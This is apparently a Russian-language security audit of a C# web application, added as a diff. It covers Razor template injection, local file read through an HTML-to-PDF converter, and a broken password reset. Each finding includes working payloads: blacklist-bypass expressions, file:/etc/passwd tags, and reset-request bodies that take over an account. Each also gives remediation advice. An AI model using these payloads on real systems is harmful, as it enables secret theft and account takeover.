@@ -1,0 +1,598 @@
+1. Файл: `TemplateService.cs` + `EmailController.cs`
+
+Что увидели:
+
+1. Пользовательский ввод (`req.Comment`) попадает в Razor-шаблон.
+2. Используется `RazorLightEngine`.
+3. Есть самописная blacklist-фильтрация.
+4. Защита строится на `string.Contains()`.
+
+```csharp
+if (!string.IsNullOrWhiteSpace(req.Comment))
+{
+    template += "\n" + req.Comment;
+}
+
+string body = await _templates.Render(template, model);
+```
+
+```csharp
+if (normalized.Contains("@{") || normalized.Contains("@()"))
+    throw new Exception("Code blocks are not allowed");
+```
+
+1.1 Уязвимость: SSTI (Server-Side Template Injection)
+Razor-шаблонизатор исполняет выражения вида:
+
+```csharp
+@(1+1)
+@DateTime.Now
+```
+
+При этом защита:
+
+* использует blacklist;
+* не ограничивает Razor syntax полностью;
+* не использует sandbox;
+* не запрещает inline expressions.
+
+Blacklist легко обходится:
+
+* через регистр;
+* через конкатенацию;
+* через альтернативные API;
+* через методы объектов.
+
+Например:
+
+```csharp
+@(1+1)
+```
+
+не блокируется вообще.
+
+---
+
+ Максимальный риск
+
+ RCE (Remote Code Execution)
+
+Так как Razor выполняется на сервере — при обходе blacklist можно:
+
+* читать файлы;
+* получать environment variables;
+* запускать процессы;
+* выполнять произвольный C# код.
+
+Потенциально:
+
+* компрометация сервера;
+* кража секретов;
+* takeover приложения;
+* lateral movement.
+
+---
+
+ Эксплуатация
+
+ Шаг 1 — подтверждаем SSTI
+
+Payload:
+
+```csharp
+@(7*7)
+```
+
+Ожидаемый результат:
+
+```text
+49
+```
+
+Это подтверждает исполнение Razor expressions.
+
+---
+
+ Шаг 2 — получение информации о runtime
+
+Payload:
+
+```csharp
+@Model.GetType().Assembly.FullName
+```
+
+Что делает:
+
+* получает тип объекта;
+* получает assembly;
+* подтверждает возможность introspection.
+
+---
+
+ Шаг 3 — обход blacklist
+
+Blacklist проверяет только наличие строк:
+
+```csharp
+"system"
+"process"
+"file"
+```
+
+Но не анализирует AST.
+
+Обход возможен:
+
+```csharp
+@("Sy"+"stem")
+```
+
+или:
+
+```csharp
+@Model.GetType().Assembly.GetType("Sys"+"tem.IO.File")
+```
+
+---
+
+ Шаг 4 — чтение файлов
+
+Payload (пример):
+
+```csharp
+@Model.GetType().Assembly
+```
+
+Далее через reflection можно дотянуться до:
+
+```csharp
+System.IO.File.ReadAllText()
+```
+
+Интересные цели:
+
+```text
+/etc/passwd
+/etc/app/secrets/admin_api_key.txt
+appsettings.json
+.env
+```
+
+---
+
+ Чем опасно
+
+В `EmailController.cs` есть секрет:
+
+```csharp
+private static readonly string AdminApiKeyPath =
+    Environment.GetEnvironmentVariable("ADMIN_API_KEY_PATH")
+    ?? "/etc/app/secrets/admin_api_key.txt";
+```
+
+То есть через SSTI можно украсть:
+
+```text
+/etc/app/secrets/admin_api_key.txt
+```
+
+А затем вызывать административный endpoint:
+
+```http
+POST /api/email/payslip
+```
+
+---
+
+ Рекомендации
+
+ 1. Никогда не рендерить пользовательский ввод как Razor template
+
+Плохо:
+
+```csharp
+template += req.Comment;
+```
+
+Нормально:
+
+```csharp
+template += HtmlEncoder.Default.Encode(req.Comment);
+```
+
+---
+
+ 2. Удалить Razor execution для пользовательского контента
+
+Пользовательские данные должны передаваться:
+
+* только как model;
+* без компиляции.
+
+---
+
+ 3. Не использовать blacklist
+
+Blacklist:
+
+* обходится;
+* не масштабируется;
+* не анализирует syntax tree.
+
+Нужен:
+
+* whitelist;
+* sandbox;
+* либо полный отказ от server-side template execution.
+
+---
+
+ 4. Ограничить доступ к секретам
+
+Секреты:
+
+* хранить вне FS;
+* использовать secret manager;
+* не давать приложению лишние filesystem permissions.
+
+2. Файл: `GeneratePdfReportController.cs`
+
+Что увидели:
+
+* Пользователь полностью контролирует HTML.
+* HTML открывается Chromium/Puppeteer.
+* Включен dangerous flag:
+
+```csharp
+--allow-file-access-from-files
+```
+
+* Используется blacklist-based sanitization.
+
+---
+
+ Уязвимость: Local File Read / SSRF через HTML-to-PDF
+
+ Почему уязвимо
+
+HTML открывается локально:
+
+```csharp
+var fileUrl = new Uri(tempHtmlPath).AbsoluteUri;
+await page.GoToAsync(fileUrl)
+```
+
+При этом Chromium получает:
+
+```csharp
+--allow-file-access-from-files
+```
+
+Это разрешает локальной HTML-странице читать локальные ресурсы.
+
+Sanitization:
+
+* удаляет только часть тегов;
+* не является полноценным HTML sanitizer;
+* основана на regex.
+
+Regex для `file:///`:
+
+```csharp
+Regex.Replace(sanitized, @"file:///", string.Empty)
+```
+
+легко обходится:
+
+```html
+file:/etc/passwd
+file://localhost/etc/passwd
+FILE:///etc/passwd
+```
+
+или через:
+
+```html
+<img src="/etc/passwd">
+```
+
+---
+
+ Максимальный риск
+
+ Arbitrary File Read
+
+Можно читать:
+
+```text
+/etc/passwd
+/etc/hosts
+appsettings.json
+SSH keys
+Docker secrets
+/etc/app/secrets/admin_api_key.txt
+```
+
+Потенциально:
+
+* утечка секретов;
+* компрометация инфраструктуры;
+* pivot в другие сервисы.
+
+---
+
+ Эксплуатация
+
+ Payload
+
+```html
+<html>
+<body>
+<img src="file:/etc/passwd">
+</body>
+</html>
+```
+
+Или:
+
+```html
+<embed src="file:/etc/passwd">
+```
+
+Если часть тегов режется — тестируются:
+
+```html
+<img>
+<object>
+<svg>
+<link>
+<iframe>
+```
+
+---
+
+ Дополнительная проблема
+
+Использование regex для HTML sanitization:
+
+```csharp
+Regex.Replace(...)
+```
+
+Regex не умеет корректно парсить HTML.
+
+Следствие:
+
+* bypass фильтрации;
+* mutation XSS;
+* обход через encoding;
+* нестандартные теги;
+* SVG payloads.
+
+---
+
+ Рекомендации
+
+ 1. Убрать dangerous flag
+
+Удалить:
+
+```csharp
+--allow-file-access-from-files
+```
+
+---
+
+ 2. Использовать нормальный sanitizer
+
+Например:
+
+```text
+Ganss.XSS
+DOMPurify
+AngleSharp sanitizer
+```
+
+---
+
+ 3. Запретить загрузку локальных ресурсов
+
+Нужен request interception:
+
+```csharp
+page.Request += ...
+```
+
+и блокировка:
+
+```text
+file://
+ftp://
+internal IP
+localhost
+metadata endpoints
+```
+
+---
+
+ 4. Изолировать PDF-generator
+
+Запускать:
+
+* в отдельном контейнере;
+* без доступа к secrets;
+* с минимальными FS permissions.
+
+3. Файл: `UserController.cs`
+
+ Уязвимость: Broken Password Reset Logic
+
+Что увидели:
+
+```csharp
+var resetToken = _db.Users.FirstOrDefault(x => x.ResetToken == req.Token);
+```
+
+Далее:
+
+```csharp
+var account = _db.Users.FirstOrDefault(x => x.Email == req.Email);
+```
+
+Токен проверяется отдельно от пользователя.
+
+Нет проверки:
+
+```csharp
+account.ResetToken == req.Token
+```
+
+---
+
+ Максимальный риск
+
+ Account Takeover
+
+Любой валидный reset token подходит для сброса пароля любого пользователя.
+
+---
+
+ Эксплуатация
+
+ Шаг 1 — получаем свой reset token
+
+```http
+POST /api/user/password/request
+```
+
+Body:
+
+```json
+{
+  "email":"attacker@corp.local"
+}
+```
+
+---
+
+ Шаг 2 — используем свой token для чужого аккаунта
+
+```http
+POST /api/user/password/reset
+```
+
+Body:
+
+```json
+{
+  "email":"admin@corp.local",
+  "token":"ATTACKER_TOKEN",
+  "newPassword":"P@ssw0rd123"
+}
+```
+
+---
+
+ Почему это работает
+
+Код:
+
+* проверяет только существование token;
+* не связывает token с email.
+
+Следовательно:
+
+* любой существующий token валиден для любого пользователя.
+
+---
+
+ Дополнительная проблема
+
+ User Enumeration
+
+```csharp
+return Ok(new { message = "Requested user does not exist!" });
+```
+
+Позволяет определять существование email.
+
+---
+
+ Рекомендации
+
+ 1. Валидировать token и пользователя одновременно
+
+Плохо:
+
+```csharp
+var resetToken = ...
+var account = ...
+```
+
+Правильно:
+
+```csharp
+var account = _db.Users.FirstOrDefault(x =>
+    x.Email == req.Email &&
+    x.ResetToken == req.Token);
+```
+
+---
+
+ 2. Добавить expiration time
+
+Нужны:
+
+```text
+ResetTokenExpiresAt
+One-time token
+Rate limit
+```
+
+---
+
+ 3. Убрать user enumeration
+
+Всегда возвращать:
+
+```text
+If account exists, email was sent.
+```
+
+ Итоговая цепочка атаки
+
+ Цепочка №1
+
+```text
+SSTI -> чтение secret -> получение AdminApiKey -> доступ к admin functionality
+```
+
+---
+
+ Цепочка №2
+
+```text
+PDF File Read -> чтение /etc/app/secrets/admin_api_key.txt -> admin access
+```
+
+---
+
+ Цепочка №3
+
+```text
+Получение любого reset token -> reset password любого пользователя -> Account Takeover
+```
+
+---
+
+Критические проблемы:
+
+* SSTI;
+* Arbitrary File Read;
+* Broken Password Reset.
+
+Все три уязвимости:
+
+* приводят к полной компрометации аккаунтов;
+* позволяют красть секреты;
+* потенциально ведут к RCE и takeover инфраструктуры.
